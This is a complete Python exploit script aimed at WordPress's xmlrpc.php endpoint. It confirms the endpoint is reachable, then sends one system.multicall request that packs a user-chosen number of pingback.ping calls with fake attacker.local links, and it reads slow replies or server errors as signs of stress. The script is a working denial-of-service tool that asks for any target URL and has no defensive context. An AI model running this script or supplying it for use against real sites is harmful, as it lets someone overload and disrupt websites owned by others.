import requests
import xml.etree.ElementTree as ET
import time
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def check_xmlrpc_available(target):
    url = f"{target.rstrip('/')}/xmlrpc.php"
    try:
        r = requests.get(url, timeout=5, verify=False)
        if "XML-RPC server accepts POST requests only" in r.text:
            print(f"[+] xmlrpc.php is available at {url}")
            return url
        else:
            print("[-] xmlrpc.php not behaving as expected. Might be disabled.")
            return None
    except Exception as e:
        print(f"[-] Error connecting to target: {e}")
        return None

def build_payload(num_calls):
    method_call = ET.Element("methodCall")
    method_name = ET.SubElement(method_call, "methodName")
    method_name.text = "system.multicall"

    params = ET.SubElement(method_call, "params")
    param = ET.SubElement(params, "param")
    value = ET.SubElement(param, "value")
    array = ET.SubElement(value, "array")
    data = ET.SubElement(array, "data")

    for i in range(num_calls):
        struct = ET.Element("struct")

        m = ET.SubElement(struct, "member")
        m_name = ET.SubElement(m, "name")
        m_name.text = "methodName"
        m_val = ET.SubElement(m, "value")
        m_str = ET.SubElement(m_val, "string")
        m_str.text = "pingback.ping"

        p = ET.SubElement(struct, "member")
        p_name = ET.SubElement(p, "name")
        p_name.text = "params"
        p_val = ET.SubElement(p, "value")
        p_array = ET.SubElement(p_val, "array")
        p_data = ET.SubElement(p_array, "data")

        fake_target = ET.SubElement(p_data, "value")
        fake_target_str = ET.SubElement(fake_target, "string")
        fake_target_str.text = "http://127.0.0.1/"

        fake_link = ET.SubElement(p_data, "value")
        fake_link_str = ET.SubElement(fake_link, "string")
        fake_link_str.text = f"http://attacker.local/fake{i}"

        val = ET.SubElement(data, "value")
        val.append(struct)

    return ET.tostring(method_call, encoding='utf-8')

def send_exploit(xmlrpc_url, num_calls):
    headers = {'Content-Type': 'text/xml'}
    payload = build_payload(num_calls)

    print(f"[i] Sending {num_calls} multicall pingbacks to {xmlrpc_url}...")
    start_time = time.time()

    try:
        r = requests.post(xmlrpc_url, data=payload, headers=headers, timeout=15, verify=False)
        elapsed = time.time() - start_time

        print(f"[+] HTTP {r.status_code} - {len(r.text)} bytes returned")
        print(f"[+] Server took {elapsed:.2f} seconds to respond")

        # Optional: check if response suggests stress
        if elapsed > 3:
            print("[!] Response took unusually long — server may be under stress.")
        elif r.status_code >= 500:
            print("[!] Server returned a 5xx error — potential overload or crash.")
        else:
            print("[i] Server seems responsive but may still be affected.")

    except Exception as e:
        print(f"[-] Exploit failed: {e}")

def main():
    target = input("Enter target URL (e.g. http://192.168.1.100): ").strip()
    try:
        num_calls = int(input("Enter number of pingbacks (e.g. 500): ").strip())
    except ValueError:
        print("[-] Invalid number.")
        return

    xmlrpc_url = check_xmlrpc_available(target)
    if xmlrpc_url:
        send_exploit(xmlrpc_url, num_calls)

if __name__ == "__main__":
    main()
